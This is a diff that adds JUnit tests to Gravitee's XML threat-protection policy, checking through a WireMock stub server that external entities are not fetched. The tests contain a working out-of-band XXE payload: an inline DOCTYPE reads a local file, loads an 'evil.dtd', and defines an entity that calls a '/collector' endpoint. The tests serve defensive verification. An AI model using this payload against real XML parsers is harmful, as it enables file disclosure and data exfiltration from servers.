@@ -15,9 +15,14 @@
  */
 package io.gravitee.policy.threatprotection.xml;
 
+import static com.github.tomakehurst.wiremock.client.WireMock.*;
+import static com.github.tomakehurst.wiremock.core.WireMockConfiguration.wireMockConfig;
 import static org.assertj.core.api.Assertions.assertThat;
 import static org.mockito.Mockito.*;
 
+import com.github.tomakehurst.wiremock.client.WireMock;
+import com.github.tomakehurst.wiremock.core.WireMockConfiguration;
+import com.github.tomakehurst.wiremock.junit.WireMockRule;
 import io.gravitee.common.http.MediaType;
 import io.gravitee.gateway.api.Request;
 import io.gravitee.gateway.api.buffer.Buffer;
@@ -30,6 +35,7 @@ import io.gravitee.policy.api.PolicyChain;
 import io.gravitee.policy.api.PolicyResult;
 import java.util.concurrent.atomic.AtomicBoolean;
 import org.junit.Before;
+import org.junit.Rule;
 import org.junit.Test;
 import org.junit.runner.RunWith;
 import org.mockito.Mock;
@@ -52,6 +58,9 @@ public class XmlThreatProtectionPolicyTest {
     XmlThreatProtectionPolicyConfiguration configuration;
 
     private XmlThreatProtectionPolicy cut;
+
+    @Rule
+    public WireMockRule wireMockRule = new WireMockRule(wireMockConfig().dynamicPort());
 
     @Before
     public void before() {
@@ -296,6 +305,96 @@ public class XmlThreatProtectionPolicyTest {
         assertThat(hasCalledEndOnReadWriteStreamParentClass).isFalse();
 
         verify(policyChain, times(1)).streamFailWith(any(PolicyResult.class));
+    }
+
+    @Test
+    public void shouldNotRejectExternalEntities() {
+        configuration.setAllowExternalEntities(true);
+        cut = new XmlThreatProtectionPolicy(configuration);
+        ReadWriteStream<Buffer> readWriteStream = cut.onRequestContent(request, policyChain);
+
+        assertThat(readWriteStream).isNotNull();
+        final AtomicBoolean hasCalledEndOnReadWriteStreamParentClass = spyEndHandler(readWriteStream);
+
+        int port = wireMockRule.port();
+        stubFor(
+            get(urlEqualTo("/evil.dtd"))
+                .willReturn(
+                    aResponse()
+                        .withStatus(200)
+                        .withBody("<!ENTITY % all \"<!ENTITY send SYSTEM 'http://localhost:" + port + "/collector'>\">" + "%all;")
+                )
+        );
+        stubFor(get(urlEqualTo("/collector")).willReturn(aResponse().withStatus(200)));
+
+        String path = getClass().getResource("/logback-test.xml").getPath();
+
+        readWriteStream.write(
+            Buffer.buffer(
+                "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n" +
+                "<!DOCTYPE data [\n" +
+                "  <!ENTITY % file SYSTEM \"file://" +
+                path +
+                "\">\n" +
+                "  <!ENTITY % dtd SYSTEM \"http://localhost:" +
+                port +
+                "/evil.dtd\">\n" +
+                "  %dtd;\n" +
+                "]>\n" +
+                "<data></data>"
+            )
+        );
+
+        readWriteStream.end();
+
+        assertThat(hasCalledEndOnReadWriteStreamParentClass).isTrue();
+
+        verify(0, getRequestedFor(urlEqualTo("/evil.dtd")));
+        verify(0, getRequestedFor(urlEqualTo("/collector")));
+        verifyZeroInteractions(policyChain);
+    }
+
+    @Test
+    public void shouldRejectExternalEntities_undeclaredEntity() {
+        configuration.setAllowExternalEntities(true);
+        cut = new XmlThreatProtectionPolicy(configuration);
+        ReadWriteStream<Buffer> readWriteStream = cut.onRequestContent(request, policyChain);
+
+        assertThat(readWriteStream).isNotNull();
+        final AtomicBoolean hasCalledEndOnReadWriteStreamParentClass = spyEndHandler(readWriteStream);
+
+        int port = wireMockRule.port();
+        stubFor(
+            get(urlEqualTo("/evil.dtd"))
+                .willReturn(
+                    aResponse()
+                        .withStatus(200)
+                        .withBody("<!ENTITY % all \"<!ENTITY send SYSTEM 'http://localhost:" + port + "/collector'>\">" + "%all;")
+                )
+        );
+        stubFor(get(urlEqualTo("/collector")).willReturn(aResponse().withStatus(200)));
+
+        String path = getClass().getResource("/logback-test.xml").getPath();
+
+        readWriteStream.write(
+            Buffer.buffer(
+                "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n" +
+                "<!DOCTYPE data [\n" +
+                "  <!ENTITY % file SYSTEM \"file://" +
+                path +
+                "\">\n" +
+                "  <!ENTITY % dtd SYSTEM \"http://localhost:" +
+                port +
+                "/evil.dtd\">\n" +
+                "  %dtd;\n" +
+                "]>\n" +
+                "<data>&send;</data>"
+            )
+        );
+
+        readWriteStream.end();
+
+        assertThat(hasCalledEndOnReadWriteStreamParentClass).isFalse();
     }
 
     /**
